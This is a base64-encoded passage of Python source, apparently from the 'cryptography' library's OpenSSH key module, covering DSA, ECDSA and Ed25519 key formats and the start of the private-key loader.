ExLCBpcW1wLCBwdWJsaWNfbnVtYmVyc1xyXG4gICAgICAgIClcclxuICAgICAgICBwcml2YXRlX2tleSA9IHByaXZhdGVfbnVtYmVycy5wcml2YXRlX2tleSgpXHJcbiAgICAgICAgcmV0dXJuIHByaXZhdGVfa2V5LCBkYXRhXHJcblxyXG4gICAgZGVmIGVuY29kZV9wdWJsaWMoXHJcbiAgICAgICAgc2VsZiwgcHVibGljX2tleTogcnNhLlJTQVB1YmxpY0tleSwgZl9wdWI6IF9GcmFnTGlzdFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgICIiIldyaXRlIFJTQSBwdWJsaWMga2V5IiIiXHJcbiAgICAgICAgcHVibiA9IHB1YmxpY19rZXkucHVibGljX251bWJlcnMoKVxyXG4gICAgICAgIGZfcHViLnB1dF9tcGludChwdWJuLmUpXHJcbiAgICAgICAgZl9wdWIucHV0X21waW50KHB1Ym4ubilcclxuXHJcbiAgICBkZWYgZW5jb2RlX3ByaXZhdGUoXHJcbiAgICAgICAgc2VsZiwgcHJpdmF0ZV9rZXk6IHJzYS5SU0FQcml2YXRlS2V5LCBmX3ByaXY6IF9GcmFnTGlzdFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgICIiIldyaXRlIFJTQSBwcml2YXRlIGtleSIiIlxyXG4gICAgICAgIHByaXZhdGVfbnVtYmVycyA9IHByaXZhdGVfa2V5LnByaXZhdGVfbnVtYmVycygpXHJcbiAgICAgICAgcHVibGljX251bWJlcnMgPSBwcml2YXRlX251bWJlcnMucHVibGljX251bWJlcnNcclxuXHJcbiAgICAgICAgZl9wcml2LnB1dF9tcGludChwdWJsaWNfbnVtYmVycy5uKVxyXG4gICAgICAgIGZfcHJpdi5wdXRfbXBpbnQocHVibGljX251bWJlcnMuZSlcclxuXHJcbiAgICAgICAgZl9wcml2LnB1dF9tcGludChwcml2YXRlX251bWJlcnMuZClcclxuICAgICAgICBmX3ByaXYucHV0X21waW50KHByaXZhdGVfbnVtYmVycy5pcW1wKVxyXG4gICAgICAgIGZfcHJpdi5wdXRfbXBpbnQocHJpdmF0ZV9udW1iZXJzLnApXHJcbiAgICAgICAgZl9wcml2LnB1dF9tcGludChwcml2YXRlX251bWJlcnMucSlcclxuXHJcblxyXG5jbGFzcyBfU1NIRm9ybWF0RFNBOlxyXG4gICAgIiIiRm9ybWF0IGZvciBEU0Ega2V5cy5cclxuXHJcbiAgICBQdWJsaWM6XHJcbiAgICAgICAgbXBpbnQgcCwgcSwgZywgeVxyXG4gICAgUHJpdmF0ZTpcclxuICAgICAgICBtcGludCBwLCBxLCBnLCB5LCB4XHJcbiAgICAiIiJcclxuXHJcbiAgICBkZWYgZ2V0X3B1YmxpYyhcclxuICAgICAgICBzZWxmLCBkYXRhOiBtZW1vcnl2aWV3XHJcbiAgICApIC0+IHR5cGluZy5UdXBsZVt0eXBpbmcuVHVwbGUsIG1lbW9yeXZpZXddOlxyXG4gICAgICAgICIiIkRTQSBwdWJsaWMgZmllbGRzIiIiXHJcbiAgICAgICAgcCwgZGF0YSA9IF9nZXRfbXBpbnQoZGF0YSlcclxuICAgICAgICBxLCBkYXRhID0gX2dldF9tcGludChkYXRhKVxyXG4gICAgICAgIGcsIGRhdGEgPSBfZ2V0X21waW50KGRhdGEpXHJcbiAgICAgICAgeSwgZGF0YSA9IF9nZXRfbXBpbnQoZGF0YSlcclxuICAgICAgICByZXR1cm4gKHAsIHEsIGcsIHkpLCBkYXRhXHJcblxyXG4gICAgZGVmIGxvYWRfcHVibGljKFxyXG4gICAgICAgIHNlbGYsIGRhdGE6IG1lbW9yeXZpZXdcclxuICAgICkgLT4gdHlwaW5nLlR1cGxlW2RzYS5EU0FQdWJsaWNLZXksIG1lbW9yeXZpZXddOlxyXG4gICAgICAgICIiIk1ha2UgRFNBIHB1YmxpYyBrZXkgZnJvbSBkYXRhLiIiIlxyXG4gICAgICAgIChwLCBxLCBnLCB5KSwgZGF0YSA9IHNlbGYuZ2V0X3B1YmxpYyhkYXRhKVxyXG4gICAgICAgIHBhcmFtZXRlcl9udW1iZXJzID0gZHNhLkRTQVBhcmFtZXRlck51bWJlcnMocCwgcSwgZylcclxuICAgICAgICBwdWJsaWNfbnVtYmVycyA9IGRzYS5EU0FQdWJsaWNOdW1iZXJzKHksIHBhcmFtZXRlcl9udW1iZXJzKVxyXG4gICAgICAgIHNlbGYuX3ZhbGlkYXRlKHB1YmxpY19udW1iZXJzKVxyXG4gICAgICAgIHB1YmxpY19rZXkgPSBwdWJsaWNfbnVtYmVycy5wdWJsaWNfa2V5KClcclxuICAgICAgICByZXR1cm4gcHVibGljX2tleSwgZGF0YVxyXG5cclxuICAgIGRlZiBsb2FkX3ByaXZhdGUoXHJcbiAgICAgICAgc2VsZiwgZGF0YTogbWVtb3J5dmlldywgcHViZmllbGRzXHJcbiAgICApIC0+IHR5cGluZy5UdXBsZVtkc2EuRFNBUHJpdmF0ZUtleSwgbWVtb3J5dmlld106XHJcbiAgICAgICAgIiIiTWFrZSBEU0EgcHJpdmF0ZSBrZXkgZnJvbSBkYXRhLiIiIlxyXG4gICAgICAgIChwLCBxLCBnLCB5KSwgZGF0YSA9IHNlbGYuZ2V0X3B1YmxpYyhkYXRhKVxyXG4gICAgICAgIHgsIGRhdGEgPSBfZ2V0X21waW50KGRhdGEpXHJcblxyXG4gICAgICAgIGlmIChwLCBxLCBnLCB5KSAhPSBwdWJmaWVsZHM6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkNvcnJ1cHQgZGF0YTogZHNhIGZpZWxkIG1pc21hdGNoIilcclxuICAgICAgICBwYXJhbWV0ZXJfbnVtYmVycyA9IGRzYS5EU0FQYXJhbWV0ZXJOdW1iZXJzKHAsIHEsIGcpXHJcbiAgICAgICAgcHVibGljX251bWJlcnMgPSBkc2EuRFNBUHVibGljTnVtYmVycyh5LCBwYXJhbWV0ZXJfbnVtYmVycylcclxuICAgICAgICBzZWxmLl92YWxpZGF0ZShwdWJsaWNfbnVtYmVycylcclxuICAgICAgICBwcml2YXRlX251bWJlcnMgPSBkc2EuRFNBUHJpdmF0ZU51bWJlcnMoeCwgcHVibGljX251bWJlcnMpXHJcbiAgICAgICAgcHJpdmF0ZV9rZXkgPSBwcml2YXRlX251bWJlcnMucHJpdmF0ZV9rZXkoKVxyXG4gICAgICAgIHJldHVybiBwcml2YXRlX2tleSwgZGF0YVxyXG5cclxuICAgIGRlZiBlbmNvZGVfcHVibGljKFxyXG4gICAgICAgIHNlbGYsIHB1YmxpY19rZXk6IGRzYS5EU0FQdWJsaWNLZXksIGZfcHViOiBfRnJhZ0xpc3RcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICAiIiJXcml0ZSBEU0EgcHVibGljIGtleSIiIlxyXG4gICAgICAgIHB1YmxpY19udW1iZXJzID0gcHVibGljX2tleS5wdWJsaWNfbnVtYmVycygpXHJcbiAgICAgICAgcGFyYW1ldGVyX251bWJlcnMgPSBwdWJsaWNfbnVtYmVycy5wYXJhbWV0ZXJfbnVtYmVyc1xyXG4gICAgICAgIHNlbGYuX3ZhbGlkYXRlKHB1YmxpY19udW1iZXJzKVxyXG5cclxuICAgICAgICBmX3B1Yi5wdXRfbXBpbnQocGFyYW1ldGVyX251bWJlcnMucClcclxuICAgICAgICBmX3B1Yi5wdXRfbXBpbnQocGFyYW1ldGVyX251bWJlcnMucSlcclxuICAgICAgICBmX3B1Yi5wdXRfbXBpbnQocGFyYW1ldGVyX251bWJlcnMuZylcclxuICAgICAgICBmX3B1Yi5wdXRfbXBpbnQocHVibGljX251bWJlcnMueSlcclxuXHJcbiAgICBkZWYgZW5jb2RlX3ByaXZhdGUoXHJcbiAgICAgICAgc2VsZiwgcHJpdmF0ZV9rZXk6IGRzYS5EU0FQcml2YXRlS2V5LCBmX3ByaXY6IF9GcmFnTGlzdFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgICIiIldyaXRlIERTQSBwcml2YXRlIGtleSIiIlxyXG4gICAgICAgIHNlbGYuZW5jb2RlX3B1YmxpYyhwcml2YXRlX2tleS5wdWJsaWNfa2V5KCksIGZfcHJpdilcclxuICAgICAgICBmX3ByaXYucHV0X21waW50KHByaXZhdGVfa2V5LnByaXZhdGVfbnVtYmVycygpLngpXHJcblxyXG4gICAgZGVmIF92YWxpZGF0ZShzZWxmLCBwdWJsaWNfbnVtYmVyczogZHNhLkRTQVB1YmxpY051bWJlcnMpIC0+IE5vbmU6XHJcbiAgICAgICAgcGFyYW1ldGVyX251bWJlcnMgPSBwdWJsaWNfbnVtYmVycy5wYXJhbWV0ZXJfbnVtYmVyc1xyXG4gICAgICAgIGlmIHBhcmFtZXRlcl9udW1iZXJzLnAuYml0X2xlbmd0aCgpICE9IDEwMjQ6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIlNTSCBzdXBwb3J0cyBvbmx5IDEwMjQgYml0IERTQSBrZXlzIilcclxuXHJcblxyXG5jbGFzcyBfU1NIRm9ybWF0RUNEU0E6XHJcbiAgICAiIiJGb3JtYXQgZm9yIEVDRFNBIGtleXMuXHJcblxyXG4gICAgUHVibGljOlxyXG4gICAgICAgIHN0ciBjdXJ2ZVxyXG4gICAgICAgIGJ5dGVzIHBvaW50XHJcbiAgICBQcml2YXRlOlxyXG4gICAgICAgIHN0ciBjdXJ2ZVxyXG4gICAgICAgIGJ5dGVzIHBvaW50XHJcbiAgICAgICAgbXBpbnQgc2VjcmV0XHJcbiAgICAiIiJcclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgc3NoX2N1cnZlX25hbWU6IGJ5dGVzLCBjdXJ2ZTogZWMuRWxsaXB0aWNDdXJ2ZSk6XHJcbiAgICAgICAgc2VsZi5zc2hfY3VydmVfbmFtZSA9IHNzaF9jdXJ2ZV9uYW1lXHJcbiAgICAgICAgc2VsZi5jdXJ2ZSA9IGN1cnZlXHJcblxyXG4gICAgZGVmIGdldF9wdWJsaWMoXHJcbiAgICAgICAgc2VsZiwgZGF0YTogbWVtb3J5dmlld1xyXG4gICAgKSAtPiB0eXBpbmcuVHVwbGVbdHlwaW5nLlR1cGxlLCBtZW1vcnl2aWV3XTpcclxuICAgICAgICAiIiJFQ0RTQSBwdWJsaWMgZmllbGRzIiIiXHJcbiAgICAgICAgY3VydmUsIGRhdGEgPSBfZ2V0X3NzaHN0cihkYXRhKVxyXG4gICAgICAgIHBvaW50LCBkYXRhID0gX2dldF9zc2hzdHIoZGF0YSlcclxuICAgICAgICBpZiBjdXJ2ZSAhPSBzZWxmLnNzaF9jdXJ2ZV9uYW1lOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJDdXJ2ZSBuYW1lIG1pc21hdGNoIilcclxuICAgICAgICBpZiBwb2ludFswXSAhPSA0OlxyXG4gICAgICAgICAgICByYWlzZSBOb3RJbXBsZW1lbnRlZEVycm9yKCJOZWVkIHVuY29tcHJlc3NlZCBwb2ludCIpXHJcbiAgICAgICAgcmV0dXJuIChjdXJ2ZSwgcG9pbnQpLCBkYXRhXHJcblxyXG4gICAgZGVmIGxvYWRfcHVibGljKFxyXG4gICAgICAgIHNlbGYsIGRhdGE6IG1lbW9yeXZpZXdcclxuICAgICkgLT4gdHlwaW5nLlR1cGxlW2VjLkVsbGlwdGljQ3VydmVQdWJsaWNLZXksIG1lbW9yeXZpZXddOlxyXG4gICAgICAgICIiIk1ha2UgRUNEU0EgcHVibGljIGtleSBmcm9tIGRhdGEuIiIiXHJcbiAgICAgICAgKGN1cnZlX25hbWUsIHBvaW50KSwgZGF0YSA9IHNlbGYuZ2V0X3B1YmxpYyhkYXRhKVxyXG4gICAgICAgIHB1YmxpY19rZXkgPSBlYy5FbGxpcHRpY0N1cnZlUHVibGljS2V5LmZyb21fZW5jb2RlZF9wb2ludChcclxuICAgICAgICAgICAgc2VsZi5jdXJ2ZSwgcG9pbnQudG9ieXRlcygpXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHJldHVybiBwdWJsaWNfa2V5LCBkYXRhXHJcblxyXG4gICAgZGVmIGxvYWRfcHJpdmF0ZShcclxuICAgICAgICBzZWxmLCBkYXRhOiBtZW1vcnl2aWV3LCBwdWJmaWVsZHNcclxuICAgICkgLT4gdHlwaW5nLlR1cGxlW2VjLkVsbGlwdGljQ3VydmVQcml2YXRlS2V5LCBtZW1vcnl2aWV3XTpcclxuICAgICAgICAiIiJNYWtlIEVDRFNBIHByaXZhdGUga2V5IGZyb20gZGF0YS4iIiJcclxuICAgICAgICAoY3VydmVfbmFtZSwgcG9pbnQpLCBkYXRhID0gc2VsZi5nZXRfcHVibGljKGRhdGEpXHJcbiAgICAgICAgc2VjcmV0LCBkYXRhID0gX2dldF9tcGludChkYXRhKVxyXG5cclxuICAgICAgICBpZiAoY3VydmVfbmFtZSwgcG9pbnQpICE9IHB1YmZpZWxkczpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiQ29ycnVwdCBkYXRhOiBlY2RzYSBmaWVsZCBtaXNtYXRjaCIpXHJcbiAgICAgICAgcHJpdmF0ZV9rZXkgPSBlYy5kZXJpdmVfcHJpdmF0ZV9rZXkoc2VjcmV0LCBzZWxmLmN1cnZlKVxyXG4gICAgICAgIHJldHVybiBwcml2YXRlX2tleSwgZGF0YVxyXG5cclxuICAgIGRlZiBlbmNvZGVfcHVibGljKFxyXG4gICAgICAgIHNlbGYsIHB1YmxpY19rZXk6IGVjLkVsbGlwdGljQ3VydmVQdWJsaWNLZXksIGZfcHViOiBfRnJhZ0xpc3RcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICAiIiJXcml0ZSBFQ0RTQSBwdWJsaWMga2V5IiIiXHJcbiAgICAgICAgcG9pbnQgPSBwdWJsaWNfa2V5LnB1YmxpY19ieXRlcyhcclxuICAgICAgICAgICAgRW5jb2RpbmcuWDk2MiwgUHVibGljRm9ybWF0LlVuY29tcHJlc3NlZFBvaW50XHJcbiAgICAgICAgKVxyXG4gICAgICAgIGZfcHViLnB1dF9zc2hzdHIoc2VsZi5zc2hfY3VydmVfbmFtZSlcclxuICAgICAgICBmX3B1Yi5wdXRfc3Noc3RyKHBvaW50KVxyXG5cclxuICAgIGRlZiBlbmNvZGVfcHJpdmF0ZShcclxuICAgICAgICBzZWxmLCBwcml2YXRlX2tleTogZWMuRWxsaXB0aWNDdXJ2ZVByaXZhdGVLZXksIGZfcHJpdjogX0ZyYWdMaXN0XHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiV3JpdGUgRUNEU0EgcHJpdmF0ZSBrZXkiIiJcclxuICAgICAgICBwdWJsaWNfa2V5ID0gcHJpdmF0ZV9rZXkucHVibGljX2tleSgpXHJcbiAgICAgICAgcHJpdmF0ZV9udW1iZXJzID0gcHJpdmF0ZV9rZXkucHJpdmF0ZV9udW1iZXJzKClcclxuXHJcbiAgICAgICAgc2VsZi5lbmNvZGVfcHVibGljKHB1YmxpY19rZXksIGZfcHJpdilcclxuICAgICAgICBmX3ByaXYucHV0X21waW50KHByaXZhdGVfbnVtYmVycy5wcml2YXRlX3ZhbHVlKVxyXG5cclxuXHJcbmNsYXNzIF9TU0hGb3JtYXRFZDI1NTE5OlxyXG4gICAgIiIiRm9ybWF0IGZvciBFZDI1NTE5IGtleXMuXHJcblxyXG4gICAgUHVibGljOlxyXG4gICAgICAgIGJ5dGVzIHBvaW50XHJcbiAgICBQcml2YXRlOlxyXG4gICAgICAgIGJ5dGVzIHBvaW50XHJcbiAgICAgICAgYnl0ZXMgc2VjcmV0X2FuZF9wb2ludFxyXG4gICAgIiIiXHJcblxyXG4gICAgZGVmIGdldF9wdWJsaWMoXHJcbiAgICAgICAgc2VsZiwgZGF0YTogbWVtb3J5dmlld1xyXG4gICAgKSAtPiB0eXBpbmcuVHVwbGVbdHlwaW5nLlR1cGxlLCBtZW1vcnl2aWV3XTpcclxuICAgICAgICAiIiJFZDI1NTE5IHB1YmxpYyBmaWVsZHMiIiJcclxuICAgICAgICBwb2ludCwgZGF0YSA9IF9nZXRfc3Noc3RyKGRhdGEpXHJcbiAgICAgICAgcmV0dXJuIChwb2ludCwpLCBkYXRhXHJcblxyXG4gICAgZGVmIGxvYWRfcHVibGljKFxyXG4gICAgICAgIHNlbGYsIGRhdGE6IG1lbW9yeXZpZXdcclxuICAgICkgLT4gdHlwaW5nLlR1cGxlW2VkMjU1MTkuRWQyNTUxOVB1YmxpY0tleSwgbWVtb3J5dmlld106XHJcbiAgICAgICAgIiIiTWFrZSBFZDI1NTE5IHB1YmxpYyBrZXkgZnJvbSBkYXRhLiIiIlxyXG4gICAgICAgIChwb2ludCwpLCBkYXRhID0gc2VsZi5nZXRfcHVibGljKGRhdGEpXHJcbiAgICAgICAgcHVibGljX2tleSA9IGVkMjU1MTkuRWQyNTUxOVB1YmxpY0tleS5mcm9tX3B1YmxpY19ieXRlcyhcclxuICAgICAgICAgICAgcG9pbnQudG9ieXRlcygpXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHJldHVybiBwdWJsaWNfa2V5LCBkYXRhXHJcblxyXG4gICAgZGVmIGxvYWRfcHJpdmF0ZShcclxuICAgICAgICBzZWxmLCBkYXRhOiBtZW1vcnl2aWV3LCBwdWJmaWVsZHNcclxuICAgICkgLT4gdHlwaW5nLlR1cGxlW2VkMjU1MTkuRWQyNTUxOVByaXZhdGVLZXksIG1lbW9yeXZpZXddOlxyXG4gICAgICAgICIiIk1ha2UgRWQyNTUxOSBwcml2YXRlIGtleSBmcm9tIGRhdGEuIiIiXHJcbiAgICAgICAgKHBvaW50LCksIGRhdGEgPSBzZWxmLmdldF9wdWJsaWMoZGF0YSlcclxuICAgICAgICBrZXlwYWlyLCBkYXRhID0gX2dldF9zc2hzdHIoZGF0YSlcclxuXHJcbiAgICAgICAgc2VjcmV0ID0ga2V5cGFpcls6MzJdXHJcbiAgICAgICAgcG9pbnQyID0ga2V5cGFpclszMjpdXHJcbiAgICAgICAgaWYgcG9pbnQgIT0gcG9pbnQyIG9yIChwb2ludCwpICE9IHB1YmZpZWxkczpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiQ29ycnVwdCBkYXRhOiBlZDI1NTE5IGZpZWxkIG1pc21hdGNoIilcclxuICAgICAgICBwcml2YXRlX2tleSA9IGVkMjU1MTkuRWQyNTUxOVByaXZhdGVLZXkuZnJvbV9wcml2YXRlX2J5dGVzKHNlY3JldClcclxuICAgICAgICByZXR1cm4gcHJpdmF0ZV9rZXksIGRhdGFcclxuXHJcbiAgICBkZWYgZW5jb2RlX3B1YmxpYyhcclxuICAgICAgICBzZWxmLCBwdWJsaWNfa2V5OiBlZDI1NTE5LkVkMjU1MTlQdWJsaWNLZXksIGZfcHViOiBfRnJhZ0xpc3RcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICAiIiJXcml0ZSBFZDI1NTE5IHB1YmxpYyBrZXkiIiJcclxuICAgICAgICByYXdfcHVibGljX2tleSA9IHB1YmxpY19rZXkucHVibGljX2J5dGVzKFxyXG4gICAgICAgICAgICBFbmNvZGluZy5SYXcsIFB1YmxpY0Zvcm1hdC5SYXdcclxuICAgICAgICApXHJcbiAgICAgICAgZl9wdWIucHV0X3NzaHN0cihyYXdfcHVibGljX2tleSlcclxuXHJcbiAgICBkZWYgZW5jb2RlX3ByaXZhdGUoXHJcbiAgICAgICAgc2VsZiwgcHJpdmF0ZV9rZXk6IGVkMjU1MTkuRWQyNTUxOVByaXZhdGVLZXksIGZfcHJpdjogX0ZyYWdMaXN0XHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiV3JpdGUgRWQyNTUxOSBwcml2YXRlIGtleSIiIlxyXG4gICAgICAgIHB1YmxpY19rZXkgPSBwcml2YXRlX2tleS5wdWJsaWNfa2V5KClcclxuICAgICAgICByYXdfcHJpdmF0ZV9rZXkgPSBwcml2YXRlX2tleS5wcml2YXRlX2J5dGVzKFxyXG4gICAgICAgICAgICBFbmNvZGluZy5SYXcsIFByaXZhdGVGb3JtYXQuUmF3LCBOb0VuY3J5cHRpb24oKVxyXG4gICAgICAgIClcclxuICAgICAgICByYXdfcHVibGljX2tleSA9IHB1YmxpY19rZXkucHVibGljX2J5dGVzKFxyXG4gICAgICAgICAgICBFbmNvZGluZy5SYXcsIFB1YmxpY0Zvcm1hdC5SYXdcclxuICAgICAgICApXHJcbiAgICAgICAgZl9rZXlwYWlyID0gX0ZyYWdMaXN0KFtyYXdfcHJpdmF0ZV9rZXksIHJhd19wdWJsaWNfa2V5XSlcclxuXHJcbiAgICAgICAgc2VsZi5lbmNvZGVfcHVibGljKHB1YmxpY19rZXksIGZfcHJpdilcclxuICAgICAgICBmX3ByaXYucHV0X3NzaHN0cihmX2tleXBhaXIpXHJcblxyXG5cclxuX0tFWV9GT1JNQVRTID0ge1xyXG4gICAgX1NTSF9SU0E6IF9TU0hGb3JtYXRSU0EoKSxcclxuICAgIF9TU0hfRFNBOiBfU1NIRm9ybWF0RFNBKCksXHJcbiAgICBfU1NIX0VEMjU1MTk6IF9TU0hGb3JtYXRFZDI1NTE5KCksXHJcbiAgICBfRUNEU0FfTklTVFAyNTY6IF9TU0hGb3JtYXRFQ0RTQShiIm5pc3RwMjU2IiwgZWMuU0VDUDI1NlIxKCkpLFxyXG4gICAgX0VDRFNBX05JU1RQMzg0OiBfU1NIRm9ybWF0RUNEU0EoYiJuaXN0cDM4NCIsIGVjLlNFQ1AzODRSMSgpKSxcclxuICAgIF9FQ0RTQV9OSVNUUDUyMTogX1NTSEZvcm1hdEVDRFNBKGIibmlzdHA1MjEiLCBlYy5TRUNQNTIxUjEoKSksXHJcbn1cclxuXHJcblxyXG5kZWYgX2xvb2t1cF9rZm9ybWF0KGtleV90eXBlOiBieXRlcyk6XHJcbiAgICAiIiJSZXR1cm4gdmFsaWQgZm9ybWF0IG9yIHRocm93IGVycm9yIiIiXHJcbiAgICBpZiBub3QgaXNpbnN0YW5jZShrZXlfdHlwZSwgYnl0ZXMpOlxyXG4gICAgICAgIGtleV90eXBlID0gbWVtb3J5dmlldyhrZXlfdHlwZSkudG9ieXRlcygpXHJcbiAgICBpZiBrZXlfdHlwZSBpbiBfS0VZX0ZPUk1BVFM6XHJcbiAgICAgICAgcmV0dXJuIF9LRVlfRk9STUFUU1trZXlfdHlwZV1cclxuICAgIHJhaXNlIFVuc3VwcG9ydGVkQWxnb3JpdGhtKGYiVW5zdXBwb3J0ZWQga2V5IHR5cGU6IHtrZXlfdHlwZSFyfSIpXHJcblxyXG5cclxuX1NTSF9QUklWQVRFX0tFWV9UWVBFUyA9IHR5cGluZy5VbmlvbltcclxuICAgIGVjLkVsbGlwdGljQ3VydmVQcml2YXRlS2V5LFxyXG4gICAgcnNhLlJTQVByaXZhdGVLZXksXHJcbiAgICBkc2EuRFNBUHJpdmF0ZUtleSxcclxuICAgIGVkMjU1MTkuRWQyNTUxOVByaXZhdGVLZXksXHJcbl1cclxuXHJcblxyXG5kZWYgbG9hZF9zc2hfcHJpdmF0ZV9rZXkoXHJcbiAgICBkYXRhOiBieXRlcyxcclxuICAgIHBhc3N3b3JkOiB0eXBpbmcuT3B0aW9uYWxbYnl0ZXNdLFxyXG4gICAgYmFja2VuZDogdHlwaW5nLkFueSA9IE5vbmUsXHJcbikgLT4gX1NTSF9QUklWQVRFX0tFWV9UWVBFUzpcclxuICAgICIiIkxvYWQgcHJpdmF0ZSBrZXkgZnJvbSBPcGVuU1NIIGN1c3RvbSBlbmNvZGluZy4iIiJcclxuICAgIHV0aWxzLl9jaGVja19ieXRlc2xpa2UoImRhdGEiLCBkYXRhKVxyXG4gICAgaWYgcGFzc3dvcmQgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgdXRpbHMuX2NoZWNrX2J5dGVzKCJwYXNzd29yZCIsIHBhc3N3b3JkKVxyXG5cclxuICAgIG0gPSBfUEVNX1JDLnNlYXJjaChkYXRhKVxyXG4gICAgaWYgbm90IG06XHJcbiAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiTm90IE9wZW5TU0ggcHJpdmF0ZSBrZXkgZm9ybWF0IilcclxuICAgIHAxID0gbS5zdGFydCgxKVxyXG4gICAgcDIgPSBtLmVuZCgxKVxyXG4gICAgZGF0YSA9IGJpbmFzY2lpLmEyYl9iYXNlNjQobWVtb3J5dmlldyhkYXRhKVtwMTpwMl0pXHJcbiAgICBpZiBub3QgZGF0YS5zdGFydHN3aXRoKF9TS19NQUdJQyk6XHJcbiAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiTm90IE9wZW5TU0ggcHJpdmF0ZSBrZXkgZm9ybWF0IilcclxuICAgIGRhdGEgPSBtZW1vcnl2aWV3KGRhdGEpW2xlbihfU0tfTUFHSUMpIDpdXHJcblxyXG4gICAgIyBwYXJzZSBoZWFkZXJcclxuICAgIGNpcGhlcm5hbWUsIGRhdGEgPSBfZ2V0X3NzaHN0cihkYXRhKVxyXG4gICAga2RmbmFtZSwgZGF0YSA9IF9nZXRfc3Noc3RyKGRhdGEpXHJcbiAgICBrZGZvcHRpb25zLCBkYXRhID0gX2dldF9zc2hzdHIoZGF0YSlcclxuICAgIG5rZXlzLCBkYXRhID0gX2dldF91MzIoZGF0YSlcclxuICAgIGlmIG5rZXlzICE9IDE6XHJcbiAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiT25seSBvbmUga2V5IHN1cHBvcnRlZCIpXHJcblxyXG4gICAgIyBsb2FkIHB1YmxpYyBrZXkgZGF0YVxyXG4gICAgcHViZGF0YSwgZGF0YSA9IF9nZXRfc3Noc3RyKGRhdGEpXHJcbiAgICBwdWJfa2V5X3R5cGUsIHB1YmRhdGEgPSBfZ2V0X3NzaHN0cihwdWJkYXRhKVxyXG4gICAga2Zvcm1hdCA9IF9sb29rdXBfa2Zvcm1hdChwdWJfa2V5X3R5cGUpXHJcbiAgICBwdWJmaWVsZHMsIHB1YmRhdGEgPSBrZm9ybWF0LmdldF9wdWJsaWMocHViZGF0YSlcclxuICAgIF9jaGVja19lbXB0eShwdWJkYXRhKVxyXG5cclxuICAgICMgbG9hZCBzZWNyZXQgZGF0YVxyXG4gICAgZWRhdGEsIGRhdGEgPSBfZ2V0X3NzaHN0cihkYXRhKVxyXG4gICAgX2NoZWNrX2VtcHR5KGRhdGEpXHJcblxyXG4gICAgaWYgKGNpcGhlcm5hbWUsIGtkZm5hbWUpICE9IChfTk9ORSwgX05PTkUpOlxyXG4gICAgICAgIGNpcGhlcm5hbWVfYnl0ZXMgPSBjaXBoZXJuYW1lLnRvYnl0ZXMoKVxyXG4gICAgICAgIGlmIGNpcGhlcm5hbWVfYnl0ZXMgbm90IGluIF9TU0hfQ0lQSEVSUzpcclxuICAgICAgICAgICAgcmFpc2UgVW5zdXBwb3J0ZWRBbGdvcml0aG0oXHJcbiAgICAgICAgICAgICAgICBmIlVuc3VwcG9ydGVkIGNpcGhlcjoge2NpcGhlcm5hbWVfYnl0ZXMhcn0iXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBpZiBrZGZuYW1lICE9IF9CQ1JZUFQ6XHJcbiAgICAgICAgICAgIHJhaXNlIFVuc3VwcG9ydGVkQWxnb3JpdGhtKGYiVW5zdXBwb3J0ZWQgS0RGOiB7a2RmbmFtZSFyfSIpXHJcbiAgICAgICAgYmxrbGVuID0gX1NTSF9DSVBIRVJTW2NpcGhlcm5hbWVfYnl0ZXNdWzNdXHJcbiAgICAgICAgX2NoZWNrX2Jsb2NrX3NpemUoZWRhdGEsIGJsa2xlbilcclxuICAgICAgICBzYWx0LCBrYnVmID0gX2dldF9zc2hzdHIoa2Rmb3B0aW9ucylcclxuICAgICAgICByb3VuZHMsIGtidWYgPSBfZ2V0X3UzMihrYnVmKVxyXG4gICAgICAgIF9jaGVja19lbXB0eShrYnVmKVxyXG4gICAgICAgIGNpcGggPSBfaW5pdF9jaXBoZXIoY2lwaGVybmFtZV9ieXRlcywgcGFzc3dvcmQsIHNhbHQudG9ieXRlcygpLCByb3VuZHMpXHJcbiAgICAgICAgZWRhdGEgPSBtZW1vcnl2aWV3KGNpcGguZGVjcnlwdG9yKCkudXBkYXRlKGVkYXRhKSlcclxuICAgIGVsc2U6XHJcbiAgICAgICAgYmxrbGVuID0gOFxyXG4gICAgICAgIF9jaGVja19ibG9ja19zaXplKGVkYXRhLCBibGtsZW4pXHJcbiAgICBjazEsIGVkYXRhID0gX2dldF91MzIoZWRhdGEpXHJcbiAgICBjazIsIGVkYXRhID0gX2dldF91MzIoZWRhdGEpXHJcbiAgICBpZiBjazEgIT0gY2syOlxyXG4gICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkNvcnJ1cHQgZGF0YTogYnJva2VuIGNoZWNrc3VtIilcclxuXHJcbiAgICAjIGxvYWQgcGVyLWtleSBzdHJ1Y3RcclxuICAgIGtleV90eXBlLCBlZGF0YSA9IF9nZXRfc3Noc3RyKGVkYXRhKVxyXG4gICAgaWYga2V5X3R5cGUgIT0gcHViX2tleV90eXBlOlxyXG4gICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkNvcnJ1cHQgZGF0YToga2V5IHR5cGUgbWlzbWF0Y2giKVxyXG4gICAgcHJpdmF0ZV9rZXksIGVkYXRhID0ga2Zvcm1hdC5sb2FkX3ByaXZhdGUoZWRhdGEsIHB1YmZpZWxkcylcclxuICAgIGNvbW1lbnQsIGVkYXRhID0gX2dldF9zc2hzdHIoZWRhdGEpXHJcblxyXG4gICAgIyB5ZXMsIFNTSCBkb2VzIHBhZGRpbmcgY2hlY2sgKmFmdGVyKiBhbGwgb3RoZXIgcGFyc2